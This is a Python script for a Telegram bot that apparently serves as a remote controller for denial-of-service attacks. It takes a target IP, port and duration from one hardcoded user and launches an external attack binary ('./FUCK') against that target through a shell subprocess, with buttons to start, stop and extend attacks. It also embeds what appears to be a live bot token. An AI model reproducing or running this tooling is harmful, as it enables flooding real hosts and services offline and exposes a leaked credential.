import telebot
import logging
import time
import os
from subprocess import PIPE
import asyncio
from threading import Thread  # Import Thread from threading module
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Initialize asyncio event loop
loop = asyncio.new_event_loop()  # Create a new event loop
asyncio.set_event_loop(loop)

TOKEN = '7031476424:AAG6bW4N65VCpxyOgdjiWQ6FYbVnGal2uXY'
USER_ID = 1165523648  # Replace with your actual user ID

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# Global variables to store attack details
attack_details = {}
attack_processes = []  # List to store multiple processes
default_duration = None  # Global variable for default duration

async def run_attack_command_async(target_ip, target_port, duration):
    global attack_processes
    try:
        # List of files to execute
        attack_files = ["./FUCK"]

        # Start multiple attack processes
        attack_processes = []
        for file in attack_files:
            command = f"{file} {target_ip} {target_port} {duration}"
            logging.info(f"Executing: {command}")
            
            # Execute the command
            process = await asyncio.create_subprocess_shell(
                command, stdout=PIPE, stderr=PIPE
            )
            attack_processes.append(process)

        # Wait for all processes to complete and log the output
        for process in attack_processes:
            stdout, stderr = await process.communicate()
            
            # Log any output or errors from the subprocess
            if stdout:
                logging.info(f"Process stdout: {stdout.decode()}")
            if stderr:
                logging.error(f"Process stderr: {stderr.decode()}")

        # Notify that the attack has ended
        bot.send_message(USER_ID, f"*Attack ended 🛑\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
    
    except Exception as e:
        logging.error(f"Error running attack command: {e}")
        bot.send_message(USER_ID, "*An error occurred while executing the attack. Please check the logs for details.*", parse_mode='Markdown')

def stop_attack():
    global attack_processes
    for process in attack_processes:
        if process:
            os.kill(process.pid, 9)  # Forcefully kill the process using SIGKILL
    attack_processes = []  # Clear the process list after termination

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.type == 'private' and message.chat.id == USER_ID:
        # Create the keyboard layout
        markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
        
        # Wider buttons for Record and Increase Duration
        btn1 = KeyboardButton("Record 📝")
        btn4 = KeyboardButton("Increase Duration ⏱")
        
        # Side-by-side buttons for Start Attack and Stop Attack
        btn2 = KeyboardButton("Start Attack 💥")
        btn3 = KeyboardButton("Stop Attack ✋")
        
        # Add buttons to the markup
        markup.add(btn1, btn4)
        markup.add(btn2, btn3)
        
        bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    global default_duration
    if message.chat.type == 'private' and message.chat.id == USER_ID:
        if message.text == "Record 📝":
            bot.send_message(message.chat.id, "*Enter the target IP, port, and duration (in seconds) separated by spaces:*", parse_mode='Markdown')
            bot.register_next_step_handler(message, record_attack_details)

        elif message.text == "Start Attack 💥":
            if 'ip' in attack_details and 'port' in attack_details and 'duration' in attack_details:
                # Use the default duration if set
                duration = default_duration or attack_details['duration']
                # Send immediate message before starting the attack
                bot.send_message(message.chat.id, f"*Attack started again💥\n\nHost: {attack_details['ip']}\nPort: {attack_details['port']}\nTime: {duration}*", parse_mode='Markdown')
                asyncio.run_coroutine_threadsafe(run_attack_command_async(attack_details['ip'], attack_details['port'], duration), loop)
            else:
                bot.send_message(message.chat.id, "*Please record attack details first using the 'Record 📝' button.*", parse_mode='Markdown')

        elif message.text == "Stop Attack ✋":
            stop_attack()
            bot.send_message(message.chat.id, "*Attack stopped successfully.*", parse_mode='Markdown')

        elif message.text == "Increase Duration ⏱":
            bot.send_message(message.chat.id, "*Enter the new default duration (in seconds):*", parse_mode='Markdown')
            bot.register_next_step_handler(message, set_default_duration)

def record_attack_details(message):
    global default_duration
    try:
        if message.chat.type == 'private' and message.chat.id == USER_ID:
            args = message.text.split()
            if len(args) != 3:
                bot.send_message(message.chat.id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
                return

            target_ip, target_port, duration = args[0], int(args[1]), args[2]

            attack_details['ip'] = target_ip
            attack_details['port'] = target_port
            attack_details['duration'] = duration
            default_duration = duration  # Set default duration to the newly recorded duration

            # Notify that the details are recorded
            bot.send_message(message.chat.id, f"*Attack details recorded 💾\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')

            # Immediately start the attack after recording details
            bot.send_message(message.chat.id, f"*Attack started immediately 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
            
            # Use run_in_executor to run async function in the background
            asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)

    except Exception as e:
        logging.error(f"Error in recording attack details: {e}")
        bot.send_message(message.chat.id, "*An error occurred while recording attack details. Please try again.*", parse_mode='Markdown')

def set_default_duration(message):
    global default_duration
    try:
        if message.chat.type == 'private' and message.chat.id == USER_ID:
            new_duration = int(message.text)
            default_duration = new_duration
            bot.send_message(message.chat.id, f"*Default duration set to {new_duration} seconds.*", parse_mode='Markdown')
    except ValueError:
        bot.send_message(message.chat.id, "*Invalid duration. Please enter a valid number.*", parse_mode='Markdown')

if __name__ == "__main__":
    # Start the asyncio event loop in a separate thread
    def start_asyncio_thread():
        loop.run_forever()

    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)  # Create a new thread for the event loop
    asyncio_thread.start()
    
    logging.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
